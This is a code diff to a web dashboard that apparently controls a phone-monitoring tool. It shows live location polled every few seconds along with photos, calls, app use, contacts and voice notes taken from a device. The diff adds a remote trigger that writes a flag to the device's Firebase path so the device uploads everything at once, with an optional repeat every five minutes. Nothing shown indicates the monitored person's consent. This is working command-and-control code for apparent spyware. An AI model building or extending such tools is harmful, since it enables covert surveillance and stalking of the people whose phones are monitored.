@@ -176,6 +176,7 @@ body{display:grid;grid-template-columns:380px 1fr;grid-template-rows:auto 1fr;he
 <button class="tab-btn" data-tab="calls">&#x1F4DE; Calls</button>
 <button class="tab-btn" data-tab="apps">&#x1F4CA; Apps</button>
 <button class="tab-btn" data-tab="geofence">&#x2699; Geo</button>
+<button class="tab-btn" data-tab="fcm">&#x1F4E1; Sync</button>
 <button class="tab-btn" data-tab="contacts">&#x1F4CD; Contacts</button>
 <button class="tab-btn" data-tab="voice">&#x1F3A4; Voice</button>
 <button class="tab-btn" data-tab="playback">&#x25B6; Playback</button>
@@ -217,6 +218,18 @@ body{display:grid;grid-template-columns:380px 1fr;grid-template-rows:auto 1fr;he
 <span class="app-period-btn" data-period="week">7-day avg</span>
  </div><div style="font-size:10px;color:var(--muted);margin-bottom:6px" id="appsSyncInfo"></div><div id="appsChart"></div></div>
 <div id="tab-geofence"><div id="geofenceList"></div></div>
+<div id="tab-fcm">
+<div class="card" style="border-left-color:var(--accent);padding:12px">
+  <div style="font-size:13px;font-weight:500;margin-bottom:8px">&#x1F4E1; Remote Sync Trigger</div>
+  <div style="font-size:11px;color:var(--muted);margin-bottom:8px">Writes a sync request flag to the device's RTDB path. The foreground service picks it up within 15 seconds and runs an immediate full sync.</div>
+  <div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:8px">
+    <button class="chip" style="background:var(--accent);color:#000;border-color:var(--accent);font-size:11px" onclick="sendFcmPush()">&#x1F504; Trigger Sync Now</button>
+    <button class="chip" style="background:var(--accent);color:#000;border-color:var(--accent);font-size:11px" onclick="toggleAutoFcm()" id="autoFcmBtn">&#x23F1; Auto-Sync: OFF</button>
+  </div>
+  <div style="font-size:10px;color:var(--muted)" id="fcmTokenInfo">No FCM token registered yet</div>
+  <div style="font-size:10px;color:var(--muted);margin-top:4px" id="fcmLastPush">Last trigger: --</div>
+</div>
+</div>
 <div id="tab-contacts"><div id="contactsList"><div class="label">No contacts synced yet</div></div></div>
 <div id="tab-voice"><div id="voiceNotesList"><div class="label">No voice notes yet</div></div></div>
 <div id="tab-insights">
@@ -350,7 +363,7 @@ let playbackLoop = false;
 
 // --- Poll Timers ---
 let pollTimers = [];
-const BASE_INTERVALS = { loc: 3000, hist: 600000, meta: 30000, photos: 300000, apps: 300000, voice: 300000 };
+const BASE_INTERVALS = { loc: 3000, hist: 600000, meta: 30000, photos: 300000, apps: 300000, voice: 300000, fcm: 60000 };
 let intervals = { ...BASE_INTERVALS };
 
 // --- Init Map ---
@@ -592,6 +605,7 @@ function startPolling() {
   schedulePoll('hist', intervals.hist, pollHistory);
   schedulePoll('voice', intervals.voice, pollVoiceNotes);
   schedulePoll('contacts', 60000, pollContacts);
+  schedulePoll('fcm', intervals.fcm, pollFcmToken);
   schedulePoll('insights', 120000, renderInsights);
 }
 
@@ -604,7 +618,7 @@ function schedulePoll(name, interval, fn) {
 }
 
 async function pollAll() {
-  const fns = [pollLocation(), pollMeta(), pollPhotos(), pollApps(), pollHistory(), pollVoiceNotes(), pollContacts()];
+  const fns = [pollLocation(), pollMeta(), pollPhotos(), pollApps(), pollHistory(), pollVoiceNotes(), pollContacts(), pollFcmToken()];
   for (const fn of fns) { try { await fn; } catch {} }
 }
 
@@ -766,6 +780,56 @@ async function preloadPhotos() {
     const line2 = dateTaken ? dateTaken + ' | ' + synced : synced;
     return '<div class="pwrap"><img src="data:image/jpeg;base64,' + doc.data + '" loading="eager" decoding="async"><div class="pcap"><div>' + escHtml(line1) + '</div><div class="ptime">' + escHtml(line2) + '</div></div></div>';
   }).filter(Boolean).join('') || '<div class="label">No photos yet</div>';
+}
+
+// --- RTDB Sync Trigger ---
+let autoSyncTimer = null;
+let fcmToken = null;
+
+async function pollFcmToken() {
+  if (!selectedDevice) return;
+  try {
+    const data = await fetchRTDB(`devices/${selectedDevice}/fcm/token`);
+    if (data && data.fcmToken) {
+      fcmToken = data.fcmToken;
+      document.getElementById('fcmTokenInfo').textContent = '\u2705 FCM token registered';
+    }
+  } catch {}
+}
+
+async function sendFcmPush() {
+  if (!selectedDevice) {
+    showAlert('No device selected', 'error');
+    return;
+  }
+  try {
+    document.getElementById('fcmLastPush').textContent = 'Requesting sync...';
+    const now = Date.now();
+    await fetch(`${RTDB}/devices/${selectedDevice}/fcm/sync_request.json`, {
+      method: 'PUT',
+      body: JSON.stringify({ requested: now, ts: now })
+    });
+    document.getElementById('fcmLastPush').textContent = '\u2705 Sync requested at ' + pkt(now);
+    showAlert('Sync request sent to device', 'warn');
+  } catch (e) {
+    document.getElementById('fcmLastPush').textContent = '\u274c Error: ' + e.message;
+    showAlert('Sync request failed: ' + e.message, 'error');
+  }
+}
+
+function toggleAutoFcm() {
+  if (autoSyncTimer) {
+    clearInterval(autoSyncTimer);
+    autoSyncTimer = null;
+    document.getElementById('autoFcmBtn').textContent = '\u23F1 Auto-Sync: OFF';
+    document.getElementById('autoFcmBtn').style.background = '';
+    return;
+  }
+  autoSyncTimer = setInterval(() => { sendFcmPush(); }, 300000);
+  document.getElementById('autoFcmBtn').textContent = '\u23F1 Auto-Sync: ON (5min)';
+  document.getElementById('autoFcmBtn').style.background = 'var(--success)';
+  document.getElementById('autoFcmBtn').style.color = '#000';
+  sendFcmPush();
 }
 
 function renderApps(sorted) {
